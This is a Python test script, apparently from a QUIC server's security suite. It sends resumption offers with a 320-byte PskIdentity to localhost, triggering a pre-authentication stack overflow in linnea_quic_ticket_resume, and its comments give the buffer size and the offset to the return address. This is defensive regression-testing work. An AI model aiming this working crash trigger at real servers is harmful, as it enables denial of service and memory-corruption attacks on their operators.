#!/usr/bin/env python3
# A resumption offer whose PskIdentity is longer than a real ticket must not
# overflow the server's stack. linnea_quic_ticket_resume opens the offered
# ticket into a 48-byte slot in its own stack frame, and the AEAD writes
# (identity_len - 28) bytes there -- including on the tag-failure path, which
# zeroes the same span. A ~300-byte identity therefore walks over the saved
# registers and the return address of a pre-authentication code path: one
# ClientHello, no valid ticket and no handshake completion required.
#
# The offer only has to be well-formed enough to reach the open: psk_dhe_ke, a
# first identity, and a 32-byte binder. The tag never verifies -- that is the
# point -- so this drives the .bad_tag zeroing rather than a decrypt.
#
# This script only puts the offer on the wire; the suite decides pass/fail by
# watching the worker PIDs (a crash is masked by the master respawning).
# Usage: h3_psk_id_overflow_test.py <port>
import socket
import ssl
import sys

from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.connection import QuicConnection

port = int(sys.argv[1])
ADDR = ("127.0.0.1", port)

# identity_len - 28 must exceed the 264 bytes from the buffer to the saved
# return address; 320 overwrites it (with zeroes) and ~50 bytes beyond.
OVERSIZED = 320


def handshake(session_ticket=None, deadline=3.0):
    """Run one handshake far enough to receive the server's flight."""
    tickets = []
    cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3"])
    cfg.verify_mode = ssl.CERT_NONE
    cfg.server_name = "localhost"
    if session_ticket is not None:
        cfg.session_ticket = session_ticket
    conn = QuicConnection(configuration=cfg, session_ticket_handler=tickets.append)
    conn.connect(ADDR, now=0.0)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(deadline)

    def flush(t):
        for d, _ in conn.datagrams_to_send(now=t):
            s.sendto(d, ADDR)

    try:
        flush(0.0)
        r, _ = s.recvfrom(4096)
        conn.receive_datagram(r, ADDR, now=0.1)
        s.settimeout(0.3)
        try:
            while True:
                r, _ = s.recvfrom(4096)
                conn.receive_datagram(r, ADDR, now=0.15)
        except socket.timeout:
            pass
        s.settimeout(deadline)
        flush(0.2)
        r, _ = s.recvfrom(4096)
        conn.receive_datagram(r, ADDR, now=0.3)
        while conn.next_event() is not None:
            pass
    except (socket.timeout, ConnectionError):
        pass
    finally:
        s.close()
    return tickets[0] if tickets else None


# A real handshake first, only to obtain a ticket object of the right shape.
ticket = handshake()
if ticket is None:
    raise SystemExit("no ticket from the first handshake")

# Oversize the identity. The bytes are opaque to the client -- aioquic copies
# them into the pre_shared_key extension verbatim and computes a binder over
# the truncated ClientHello, so the offer stays well-formed.
ticket.ticket = bytes(OVERSIZED)

# A couple of source ports, to reach more than one worker.
for _ in range(3):
    handshake(session_ticket=ticket, deadline=1.0)

print(f"sent resumption offers with a {OVERSIZED}-byte PskIdentity")
